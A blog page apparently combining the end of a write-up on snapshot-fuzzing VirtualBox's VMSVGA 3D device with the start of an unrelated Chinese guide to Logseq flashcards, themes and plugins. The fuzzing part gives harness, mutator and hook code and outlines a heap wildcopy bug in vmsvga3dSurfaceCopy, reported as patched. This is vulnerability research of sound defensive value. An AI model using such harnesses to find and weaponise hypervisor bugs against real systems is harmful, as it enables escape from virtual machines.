<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">const</span> Gva_t SvgaLoopStart = <span class="built_in">Gva_t</span>(g_Dbg.<span class="built_in">GetSymbol</span>(<span class="string">&quot;VBoxDD!vmsvgaR3FifoLoop&quot;</span>) + <span class="number">0x4e2</span>);</span><br><span class="line"><span class="keyword">if</span>(!g_Backend-&gt;<span class="built_in">Setbreakpoint</span>(SvgaLoopStart, [](Backend_t *Backend) &#123;</span><br><span class="line">  <span class="keyword">if</span>(GlobalState.SvgaCmds.<span class="built_in">size</span>() == <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="built_in">DebugPrint</span>(<span class="string">&quot;testcase deque empty! goto next round...\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> Backend-&gt;<span class="built_in">Stop</span>(<span class="built_in">Ok_t</span>());</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">auto</span> &amp;Testcase = GlobalState.SvgaCmds.<span class="built_in">front</span>();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> (Testcase.SvgaCmdCode == <span class="number">1045</span>) &#123;</span><br><span class="line">    GlobalState.SvgaCmds.<span class="built_in">pop_front</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(GlobalState.SvgaCmds.<span class="built_in">size</span>() == <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="built_in">DebugPrint</span>(<span class="string">&quot;testcase deque empty during cmd filtering! goto next round...\n&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> Backend-&gt;<span class="built_in">Stop</span>(<span class="built_in">Ok_t</span>());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Testcase = GlobalState.SvgaCmds.<span class="built_in">front</span>();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  Backend-&gt;<span class="built_in">Rbx</span>(Testcase.SvgaCmdCode);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">DebugPrint</span>(<span class="string">&quot;SvgaCmdCode = &#123;:#x&#125;\n&quot;</span>, Testcase.SvgaCmdCode);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(Testcase.SvgaCmdCode &gt;= <span class="number">1040</span>) &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">DebugPrint</span>(<span class="string">&quot;Have to avoid AssertBreak(pHdr-&gt;size &lt; pThis-&gt;svga.cbFIFO), write &#123;:#x&#125; on first DWORD\n&quot;</span>, Testcase.SvgaBody.<span class="built_in">size</span>());</span><br><span class="line"></span><br><span class="line">    <span class="type">const</span> <span class="type">uint32_t</span> Svga3dCmdSize = Testcase.SvgaBody.<span class="built_in">size</span>();</span><br><span class="line">    <span class="keyword">if</span>(Svga3dCmdSize &gt;= <span class="number">0x200000</span>) &#123;</span><br><span class="line">      fmt::<span class="built_in">print</span>(<span class="string">&quot;Svga3dCmdSize(&#123;:#x&#125;) &gt; cbFIFO, abort\n&quot;</span>, Svga3dCmdSize);</span><br><span class="line">      std::<span class="built_in">abort</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memcpy</span>(&amp;GlobalState.SvgaCmdBody[<span class="number">0</span>], &amp;Svga3dCmdSize, <span class="number">4</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(&amp;GlobalState.SvgaCmdBody[<span class="number">4</span>], Testcase.SvgaBody.<span class="built_in">data</span>(), Testcase.SvgaBody.<span class="built_in">size</span>());</span><br><span class="line">    GlobalState.SvgaCmdBodySize = Testcase.SvgaBody.<span class="built_in">size</span>() + <span class="number">4</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">memcpy</span>(GlobalState.SvgaCmdBody, Testcase.SvgaBody.<span class="built_in">data</span>(), Testcase.SvgaBody.<span class="built_in">size</span>());</span><br><span class="line">    GlobalState.SvgaCmdBodySize = Testcase.SvgaBody.<span class="built_in">size</span>();</span><br><span class="line">  &#125;    </span><br><span class="line"></span><br><span class="line">  GlobalState.SvgaCmds.<span class="built_in">pop_front</span>();</span><br><span class="line">&#125;)) &#123;</span><br><span class="line">  fmt::<span class="built_in">print</span>(<span class="string">&quot;Failed to Setbreakpoint on SvgaLoopStart\n&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>After some investigation, I found <code>CreateDeviceEx</code> call in <code>vmsvga3dContextDefine</code> keep causing <strong>CR3 context switching</strong> and I didn’t found any way to handling it using breakpoint handler. So I just blacklisting it( <code>SVGA_3D_CMD_CONTEXT_DEFINE</code> &#x3D; <code>1045</code> ).</p>
<p>I disclose almost every part of fuzz module except mutation part. I just use libfuzzer mutator to mutate body data of SVGA command and pick one of command in array randomly.</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">explicit</span> <span class="title">CustomMutator_t</span><span class="params">(std::mt19937_64 &amp;Rng, <span class="type">const</span> <span class="type">size_t</span> TestcaseMaxSize)</span></span></span><br><span class="line"><span class="function">  : Rng_(Rng), TestcaseMaxSize_(TestcaseMaxSize) &#123;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// set maximum size for multiple (mutated) testcase( Default = 1MB )</span></span><br><span class="line">    ScratchBuffer__ = std::<span class="built_in">make_unique</span>&lt;<span class="type">uint8_t</span>[]&gt;(_1MB);</span><br><span class="line">    ScratchBuffer_  = &#123;ScratchBuffer__.<span class="built_in">get</span>(), _1MB&#125;;</span><br><span class="line"></span><br><span class="line">    BodyMutator_ = <span class="built_in">make_unique</span>&lt;LibfuzzerMutator_t&gt;(Rng, TestcaseMaxSize);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// skip for brevity...</span></span><br><span class="line"></span><br><span class="line"><span class="function">std::string <span class="title">Mutate</span><span class="params">(<span class="type">uint8_t</span> *Data, <span class="type">const</span> <span class="type">size_t</span> DataLen, <span class="type">const</span> <span class="type">size_t</span> MaxSize)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">auto</span> Root = <span class="built_in">Deserialize</span>(Data, DataLen);</span><br><span class="line">  <span class="keyword">auto</span> &amp;SvgaCmds = Root.SvgaCmds;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">auto</span> &amp;SvgaCmd : SvgaCmds) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// 50%</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">GetUint32</span>(<span class="number">0</span>, <span class="number">1</span>) == <span class="number">1</span>) &#123;  </span><br><span class="line">      <span class="type">uint32_t</span> SvgaCmdRandomIdx = <span class="built_in">GetUint32</span>(<span class="number">0</span>, SvgaCmdListLen);</span><br><span class="line">      SvgaCmd.SvgaCmdCode = SvgaCmdList[SvgaCmdRandomIdx];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memcpy</span>(GlobalMutBuffer, SvgaCmd.SvgaBody.<span class="built_in">data</span>(), SvgaCmd.SvgaBody.<span class="built_in">size</span>());</span><br><span class="line">    <span class="type">size_t</span> NewTestcaseSize = BodyMutator_-&gt;Mut_.<span class="built_in">Mutate</span>(GlobalMutBuffer, SvgaCmd.SvgaBody.<span class="built_in">size</span>(), MaxSize);</span><br><span class="line">    SvgaCmd.SvgaBody.<span class="built_in">resize</span>(NewTestcaseSize);</span><br><span class="line">    <span class="built_in">memcpy</span>(SvgaCmd.SvgaBody.<span class="built_in">data</span>(), GlobalMutBuffer, NewTestcaseSize);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  json::json Serialized;</span><br><span class="line">  <span class="built_in">to_json</span>(Serialized, Root);</span><br><span class="line">  <span class="keyword">return</span> Serialized.<span class="built_in">dump</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>I also define generator function. It is very useful if you are too lazy to create random input like me ^~^.</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">std::string <span class="title">GenerateTestcase</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  SvgaCmds_t Root;</span><br><span class="line">  <span class="type">const</span> <span class="keyword">auto</span> N = <span class="built_in">GetUint32</span>(<span class="number">1</span>, <span class="number">10</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (<span class="type">size_t</span> Idx = <span class="number">0</span>; Idx &lt; N; Idx++) &#123;</span><br><span class="line">    SvgaCmd_t SvgaCmd;</span><br><span class="line">    </span><br><span class="line">    SvgaCmd.SvgaCmdCode = SvgaCmdList[<span class="built_in">GetUint32</span>(<span class="number">0</span>, SvgaCmdListLen)];</span><br><span class="line">    SvgaCmd.SvgaBody.<span class="built_in">resize</span>(<span class="built_in">GetUint32</span>(<span class="number">0x100</span>, <span class="number">0x400</span>));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">GetUint32</span>(<span class="number">0</span>, <span class="number">1</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; SvgaCmd.SvgaBody.<span class="built_in">size</span>(); i++) &#123;</span><br><span class="line">        SvgaCmd.SvgaBody[i] = <span class="number">0x41</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; SvgaCmd.SvgaBody.<span class="built_in">size</span>(); i++) &#123;</span><br><span class="line">        SvgaCmd.SvgaBody[i] = (<span class="type">uint8_t</span>)<span class="built_in">GetUint32</span>(<span class="number">0</span>, <span class="number">255</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Root.SvgaCmds.<span class="built_in">emplace_back</span>(SvgaCmd);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  json::json Serialized;</span><br><span class="line">  <span class="built_in">to_json</span>(Serialized, Root);</span><br><span class="line">  <span class="keyword">return</span> Serialized.<span class="built_in">dump</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">std::string <span class="title">GetNewTestcase</span><span class="params">(<span class="type">const</span> Corpus_t &amp;Corpus)</span> <span class="keyword">override</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//</span></span><br><span class="line">  <span class="comment">// 20%</span></span><br><span class="line">  <span class="comment">//</span></span><br><span class="line">  <span class="keyword">if</span>(<span class="built_in">GetUint32</span>(<span class="number">1</span>, <span class="number">5</span>) == <span class="number">1</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">GenerateTestcase</span>();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="type">const</span> Testcase_t *Testcase = Corpus.<span class="built_in">PickTestcase</span>();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!Testcase) &#123;</span><br><span class="line">    fmt::<span class="built_in">print</span>(<span class="string">&quot;The corpus is empty, generate random one\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">GenerateTestcase</span>();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//</span></span><br><span class="line">  <span class="comment">// Copy the input in a buffer we&#x27;re going to mutate.</span></span><br><span class="line">  <span class="comment">//</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memcpy</span>(ScratchBuffer_.<span class="built_in">data</span>(), Testcase-&gt;Buffer_.<span class="built_in">get</span>(),</span><br><span class="line">         Testcase-&gt;BufferSize_);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// return Mutate(ScratchBuffer_.data(), Testcase-&gt;BufferSize_, TestcaseMaxSize_);</span></span><br><span class="line">  </span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">Mutate</span>(ScratchBuffer_.<span class="built_in">data</span>(), Testcase-&gt;BufferSize_, u32PbBounceBufMaxSize - <span class="built_in">sizeof</span>(<span class="type">uint32_t</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Aaaaannnd, this is everything you need to fuzz! I skip some formal code for brevity, but I think you can easily find what you need to define fully working fuzz module.</p>
<p>…..Ooooh wait, I forgot something. After some hours of struggle, I define a blacklist which cause CR3 context switching. I just put it on the end of <code>Init()</code> function.</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">bool</span> <span class="title">SetupVBoxBlacklistHooks</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(!g_Backend-&gt;<span class="built_in">SetBreakpoint</span>(<span class="string">&quot;VBoxRT!RTLogLoggerEx&quot;</span>, [](Backend_t *Backend) &#123;</span><br><span class="line">    Backend-&gt;<span class="built_in">SimulateReturnFromFunction</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;)) &#123;</span><br><span class="line">    fmt::<span class="built_in">print</span>(<span class="string">&quot;Failed to SetBreakpoint on VBoxRT!RTLogLoggerEx\n&quot;</span>);</span><br><span class="line">    std::<span class="built_in">abort</span>();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(!g_Backend-&gt;<span class="built_in">SetBreakpoint</span>(<span class="string">&quot;VBoxVMM!PDMCritSectLeave&quot;</span>, [](Backend_t *Backend) &#123;</span><br><span class="line">    Backend-&gt;<span class="built_in">SimulateReturnFromFunction</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;)) &#123;</span><br><span class="line">    fmt::<span class="built_in">print</span>(<span class="string">&quot;Failed to SetBreakpoint on VBoxVMM!PDMCritSectLeave\n&quot;</span>);</span><br><span class="line">    std::<span class="built_in">abort</span>();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(!g_Backend-&gt;<span class="built_in">SetBreakpoint</span>(<span class="string">&quot;VBoxC!util::AutoLockBase::release&quot;</span>, [](Backend_t *Backend) &#123;</span><br><span class="line">    Backend-&gt;<span class="built_in">SimulateReturnFromFunction</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;)) &#123;</span><br><span class="line">    fmt::<span class="built_in">print</span>(<span class="string">&quot;Failed to SetBreakpoint on VBoxC!util::AutoLockBase::release\n&quot;</span>);</span><br><span class="line">    std::<span class="built_in">abort</span>();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(!g_Backend-&gt;<span class="built_in">SetBreakpoint</span>(<span class="string">&quot;VBoxC!util::AutoLockBase::acquire&quot;</span>, [](Backend_t *Backend) &#123;</span><br><span class="line">    Backend-&gt;<span class="built_in">SimulateReturnFromFunction</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;)) &#123;</span><br><span class="line">    fmt::<span class="built_in">print</span>(<span class="string">&quot;Failed to SetBreakpoint on VBoxC!util::AutoLockBase::acquire\n&quot;</span>);</span><br><span class="line">    std::<span class="built_in">abort</span>();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(!g_Backend-&gt;<span class="built_in">SetBreakpoint</span>(<span class="string">&quot;VirtualBoxVM!UIFrameBufferPrivate::NotifyChange&quot;</span>, [](Backend_t *Backend) &#123;</span><br><span class="line">    Backend-&gt;<span class="built_in">SimulateReturnFromFunction</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;)) &#123;</span><br><span class="line">    fmt::<span class="built_in">print</span>(<span class="string">&quot;Failed to SetBreakpoint on VirtualBoxVM!UIFrameBufferPrivate::NotifyChange\n&quot;</span>);</span><br><span class="line">    std::<span class="built_in">abort</span>();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(!g_Backend-&gt;<span class="built_in">SetBreakpoint</span>(<span class="string">&quot;VBoxRT!SUPSemEventWaitNoResume&quot;</span>, [](Backend_t *Backend) &#123;</span><br><span class="line">    Backend-&gt;<span class="built_in">SimulateReturnFromFunction</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;)) &#123;</span><br><span class="line">    fmt::<span class="built_in">print</span>(<span class="string">&quot;Failed to SetBreakpoint on VBoxRT!SUPSemEventWaitNoResume\n&quot;</span>);</span><br><span class="line">    std::<span class="built_in">abort</span>();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(!g_Backend-&gt;<span class="built_in">SetBreakpoint</span>(<span class="string">&quot;d3d9!CBaseDevice::Release&quot;</span>, [](Backend_t *Backend) &#123;</span><br><span class="line">    Backend-&gt;<span class="built_in">SimulateReturnFromFunction</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;)) &#123;</span><br><span class="line">    fmt::<span class="built_in">print</span>(<span class="string">&quot;Failed to SetBreakpoint on d3d9!CBaseDevice::Release\n&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">if</span>(!g_Backend-&gt;<span class="built_in">SetBreakpoint</span>(<span class="string">&quot;d3d9!CD3DBase::Clear&quot;</span>, [](Backend_t *Backend) &#123;</span><br><span class="line">    Backend-&gt;<span class="built_in">SimulateReturnFromFunction</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;)) &#123;</span><br><span class="line">    fmt::<span class="built_in">print</span>(<span class="string">&quot;Failed to SetBreakpoint on d3d9!CD3DBase::Clear\n&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">if</span>(!g_Backend-&gt;<span class="built_in">SetBreakpoint</span>(<span class="string">&quot;d3d9!CMipMap::SetAutoGenFilterType&quot;</span>, [](Backend_t *Backend) &#123;</span><br><span class="line">    Backend-&gt;<span class="built_in">SimulateReturnFromFunction</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;)) &#123;</span><br><span class="line">    fmt::<span class="built_in">print</span>(<span class="string">&quot;Failed to SetBreakpoint on d3d9!CMipMap::SetAutoGenFilterType\n&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">if</span>(!g_Backend-&gt;<span class="built_in">SetBreakpoint</span>(<span class="string">&quot;d3d9!CMipMap::GenerateMipSubLevels&quot;</span>, [](Backend_t *Backend) &#123;</span><br><span class="line">    Backend-&gt;<span class="built_in">SimulateReturnFromFunction</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;)) &#123;</span><br><span class="line">    fmt::<span class="built_in">print</span>(<span class="string">&quot;Failed to SetBreakpoint on d3d9!CMipMap::GenerateMipSubLevels\n&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(!g_Backend-&gt;<span class="built_in">SetBreakpoint</span>(<span class="string">&quot;USER32!GetDC&quot;</span>, [](Backend_t *Backend) &#123;</span><br><span class="line">    Backend-&gt;<span class="built_in">SimulateReturnFromFunction</span>(<span class="number">0x1337</span>);</span><br><span class="line">  &#125;)) &#123;</span><br><span class="line">    fmt::<span class="built_in">print</span>(<span class="string">&quot;Failed to SetBreakpoint on USER32!GetDC\n&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Yep. That’s really everything. I use this fuzz module several hours and it founds interesting crash.</p>
<h1 id="3-Vulnerability-TL-DR"><a href="#3-Vulnerability-TL-DR" class="headerlink" title="3. Vulnerability( TL;DR )"></a>3. Vulnerability( TL;DR )</h1><p>Crash occurred in <code>vmsvga3dSurfaceCopy</code> function( <strong>PageHeap</strong> needed ).</p>
<p><img src="https://github.com/henices/pictures/raw/master/wtf-vbox-blahblah2.png" alt="blahblah2"></p>
<p>This function trying to copy surface data from one to another using surface id and there’s no boundary check between surface, so it become exploitable wildcopy vulnerability in heap memory.</p>
<p><img src="https://github.com/henices/pictures/raw/master/wtf-vbox-blahblah3.png" alt="spot the bug"></p>
<p>This vulnerability patched in <a target="_blank" rel="noopener" href="https://www.oracle.com/security-alerts/cpujul2022.html">6.1.36 release</a> at July, 2022.</p>
<h1 id="4-Conclusion"><a href="#4-Conclusion" class="headerlink" title="4. Conclusion"></a>4. Conclusion</h1><p>I think importance of snapshot fuzzing is, it makes researcher to focus on target itself. </p>
<p>Unlike other fuzzers based on runtime and DBI are often create (very) unreasonable side effect or need lots of time to create working harness. The concept of snapshot fuzzing makes it possible to reduce this waste of time.</p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://usmacd.com/cn/logseq2/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpg">
      <meta itemprop="name" content="henices">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="安全代码">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | 安全代码">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/cn/logseq2/" class="post-title-link" itemprop="url">Logseq 使用小结 （二）</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>

      <time title="Created: 2022-03-07 00:00:00" itemprop="dateCreated datePublished" datetime="2022-03-07T00:00:00+08:00">2022-03-07</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <p>用了 Logseq 一段时间了，做个简单的总结，国内的很多文章，在我看来还是不够简单明了, 本文大致介绍了 Logseq 比较常用的一些功能的使用。</p>
<h2 id="Flashcards"><a href="#Flashcards" class="headerlink" title="Flashcards"></a>Flashcards</h2><p>可以把记录的知识点当作卡片来记忆，用过 Anki 的同学，应该都比较熟悉了，使用的记忆算法为 <a target="_blank" rel="noopener" href="https://www.supermemo.com/en/archives1990-2015/english/ol/sm5">SM-5</a><br>要将一个 block 记为卡片非常简单，使用 <code>#card</code> 标签就可以了。</p>
<p><img src="https://github.com/henices/pictures/raw/master/logseq5.png"></p>
<h3 id="卡片组"><a href="#卡片组" class="headerlink" title="卡片组"></a>卡片组</h3><p>有些卡片可能是归属同一个大类，这时候就可以使用卡片组了。像我上面这个例子中，要记忆的单词都在 <code>英语单词积累</code>下，就可以使用语法 <code>&#123;&#123;cards 英语单词积累&#125;&#125;</code> 效果如下图，<br>可以看出我已经积累了7张卡片了。</p>
<p><img src="https://github.com/henices/pictures/raw/master/logseq6.png"></p>
<p>要背诵需要记忆的卡片时，单击左侧的 Flashcards 就可以了，使用方面没有什么特别的地方，有三个选项可以选择。</p>
<p><img src="https://github.com/henices/pictures/raw/master/logseq7.png"></p>
<h2 id="theme-（皮肤）"><a href="#theme-（皮肤）" class="headerlink" title="theme （皮肤）"></a>theme （皮肤）</h2><p>皮肤就是青菜萝卜各有所爱了，推荐两款我自己比较喜欢的的皮肤。</p>
<p><img src="https://github.com/pengx17/logseq-laurel-theme/raw/master/white.png"><br><img src="https://raw.githubusercontent.com/tobealive/logseq-allday-theme/main/preview.png"></p>
<p>Github 仓库地址如下：</p>
<p><a target="_blank" rel="noopener" href="https://github.com/pengx17/logseq-laurel-theme">https://github.com/pengx17/logseq-laurel-theme</a><br><a target="_blank" rel="noopener" href="https://github.com/tobealive/logseq-allday-theme">https://github.com/tobealive/logseq-allday-theme</a></p>
<p>有两种方法可以设置皮肤：</p>
<ul>
<li>custom.css</li>
<li>plugin system</li>
</ul>
<p>使用 custom.css，打开 Settings -&gt;     General -&gt;  Custom theme  点击 <code>custom.css</code> 复制 css 内容，保存退出即可。<br>使用插件系统，则需要先把插件系统打开，Settings  -&gt;  Advanced -&gt; Plug-in system 。打开插件系统后，可以直接使用<br>Plugins -&gt; Marketplace -&gt; themes 选择你喜欢的 theme 点击 <code>Install</code> 就可以了</p>
<p>不过还是推荐使用 Logseq 自带的插件管理系统来安装，可以自动升级比较方便，切换皮肤可以点击右上角 三个点 -&gt; Themes 选择皮肤。 </p>
<h2 id="plugin-（插件）"><a href="#plugin-（插件）" class="headerlink" title="plugin （插件）"></a>plugin （插件）</h2><p>使用 Logseq 插件同样是两种方法：</p>
<ul>
<li>plugin system</li>
<li>Load unpacked plugin</li>
</ul>
